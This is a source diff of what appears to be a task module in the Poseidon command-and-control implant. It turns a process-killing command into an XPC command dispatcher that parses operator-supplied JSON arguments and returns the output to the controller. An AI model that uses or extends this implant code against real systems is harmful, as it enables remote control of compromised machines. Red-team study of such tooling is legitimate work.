@@ -1,25 +1,47 @@
-package kill
+package xpc
 
 import (
 	"encoding/json"
-	"fmt"
-	"os"
-	"strconv"
 	"sync"
-	"syscall"
 
 	"github.com/xorrior/poseidon/pkg/profiles"
 	"github.com/xorrior/poseidon/pkg/utils/structs"
 )
 
 var mu sync.Mutex
+var results json.RawMessage
+var args Arguments
 
-//Run - Function that executes the shell command
+type Arguments struct {
+	Command     string `json:"command"`
+	ServiceName string `json:"servicename"`
+	Program     string `json:"program"`
+	File        string `json:"file"`
+	KeepAlive   bool   `json:"keepalive"`
+	Pid         int    `json:"pid"`
+	Data        string `json:"data"`
+}
+
 func Run(task structs.Task) {
 	msg := structs.Response{}
 	msg.TaskID = task.TaskID
+	args = Arguments{}
+	err := json.Unmarshal([]byte(task.Params), &args)
 
-	pid, err := strconv.Atoi(task.Params)
+	if err != nil {
+
+		msg.UserOutput = err.Error()
+		msg.Completed = true
+		msg.Status = "error"
+
+		resp, _ := json.Marshal(msg)
+		mu.Lock()
+		profiles.TaskResponses = append(profiles.TaskResponses, resp)
+		mu.Unlock()
+		return
+	}
+
+	res, err := runCommand(args.Command)
 
 	if err != nil {
 		msg.UserOutput = err.Error()
@@ -33,23 +55,9 @@ func Run(task structs.Task) {
 		return
 	}
 
-	p, err := os.FindProcess(pid)
-
-	if err != nil {
-		msg.UserOutput = err.Error()
-		msg.Completed = true
-		msg.Status = "error"
-
-		resp, _ := json.Marshal(msg)
-		mu.Lock()
-		profiles.TaskResponses = append(profiles.TaskResponses, resp)
-		mu.Unlock()
-		return
-	}
-
-	p.Signal(syscall.SIGKILL)
+	msg.UserOutput = string(res)
 	msg.Completed = true
-	msg.UserOutput = fmt.Sprintf("Killed process with PID %s", task.Params)
+
 	resp, _ := json.Marshal(msg)
 	mu.Lock()
 	profiles.TaskResponses = append(profiles.TaskResponses, resp)
